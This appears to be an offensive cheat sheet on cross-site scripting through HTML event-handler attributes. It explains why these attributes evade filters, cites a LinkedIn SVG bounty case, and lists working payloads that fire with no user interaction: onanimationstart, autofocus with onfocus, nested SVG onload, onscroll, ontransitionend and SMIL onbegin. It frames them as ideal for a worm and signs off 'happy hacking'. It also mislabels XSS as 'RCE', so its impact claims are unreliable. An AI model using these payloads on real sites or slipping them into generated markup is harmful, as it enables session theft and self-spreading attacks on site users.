Event Handlers

What they are

HTML attributes that execute JS when a browser event fires. No need for <script> tags.

Why they work

Browser trusts attribute content as same-origin script; filters often whitelist attribute names.

Where you’ll meet them

User cards, image galleries, animated CSS widgets, SVG icons, auto-playing videos.

Impact

Zero-user-interaction RCE (auto-focus, animation-end, CSS scroll trick) → perfect for worm.

Mini case-study

2021 LinkedIn SVG avatar onanimationstart → stolen session → $5 000 bounty.

Payloads

// Fires as soon as element renders
<style>@keyframes x{}</style>
<div style="animation:x 1s" onanimationstart="alert(1)"></div>
// No click — focuses itself
<input onfocus="alert(1)" autofocus>
// Double exec — outer + inner
<svg><image href="data:image/svg+xml,<svg onload=alert(1)>" onload=alert(2)></svg>
// :target scrolls → fires onscroll
<style>div{height:50px;overflow:scroll}</style>
<div onscroll="alert(1)"><br><br><br><br></div>
#target
// 0 s still ends → event fires
<div style="transition:all 0s" ontransitionend="alert(1)"></div>
// Firefox still supports SMIL
<svg><animate onbegin="alert(1)" attributeName="x" dur="1s"></svg>
EOF ── happy hacking :)
